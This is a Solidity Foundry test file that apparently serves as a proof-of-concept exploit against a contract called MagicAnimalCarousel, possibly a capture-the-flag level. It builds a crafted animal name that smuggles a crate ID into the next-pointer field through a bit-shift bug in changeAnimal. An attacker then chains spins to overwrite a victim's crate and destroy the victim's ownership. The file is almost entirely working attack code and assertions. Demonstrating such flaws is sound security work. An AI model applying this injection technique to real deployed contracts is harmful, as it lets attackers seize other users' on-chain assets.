// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {MagicAnimalCarousel} from "../MagicAnimal.sol";

contract MagicAnimalCarouselExploitTest is Test {
    MagicAnimalCarousel carousel;

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    uint256 constant OWNER_MASK = uint256(type(uint160).max);

    function setUp() public {
        carousel = new MagicAnimalCarousel();
    }

    /// @dev Builds a 12-byte name: first 10 bytes are cosmetic filler,
    ///      last 2 bytes are the crateId we want injected into the
    ///      nextCrateId field via changeAnimal's shift bug.
    function _craftName(bytes10 visible, uint16 targetNextId) internal pure returns (string memory) {
        bytes memory b = new bytes(12);
        for (uint256 i = 0; i < 10; i++) {
            b[i] = visible[i];
        }
        b[10] = bytes1(uint8(targetNextId >> 8));
        b[11] = bytes1(uint8(targetNextId));
        return string(b);
    }

    function _ownerOf(uint256 crateId) internal view returns (address) {
        uint256 raw = carousel.carousel(crateId);
        return address(uint160(raw & OWNER_MASK));
    }

    function test_HijackAnotherUsersCrate() public {
        // Victim claims crate 1
        vm.prank(victim);
        carousel.setAnimalAndSpin("Elephant");
        assertEq(_ownerOf(1), victim, "victim should own crate 1");

        // Attacker claims crate 2 to launch the attack from
        vm.prank(attacker);
        carousel.setAnimalAndSpin("Zebra");
        assertEq(_ownerOf(2), attacker, "attacker should own crate 2");

        // Corrupt crate 2's nextCrateId to 0xFFFF (always achievable via OR)
        vm.prank(attacker);
        carousel.changeAnimal(_craftName(bytes10("AAAAAAAAAA"), 0xFFFF), 2);

        // Spin -> lands on crate 65535 (fresh, now attacker-owned)
        vm.prank(attacker);
        carousel.setAnimalAndSpin("Fake1");
        assertEq(_ownerOf(65535), attacker, "attacker should now own crate 65535");

        // Explicitly inject victim's crate ID (1) as the next pointer
        vm.prank(attacker);
        carousel.changeAnimal(_craftName(bytes10("BBBBBBBBBB"), 1), 65535);

        // Spin one more time -> setAnimalAndSpin blindly overwrites crate 1
        vm.prank(attacker);
        carousel.setAnimalAndSpin("Hijacked");

        address newOwner = _ownerOf(1);
        console2.log("Crate 1 owner before attack:", victim);
        console2.log("Crate 1 owner after attack: ", newOwner);

        // Prove the invariant is broken: victim's clean ownership is destroyed,
        // even though the resulting owner field is a corrupted OR-merge rather
        // than a clean attacker address.
        assertTrue(newOwner != victim, "victim should have lost ownership");
    }
}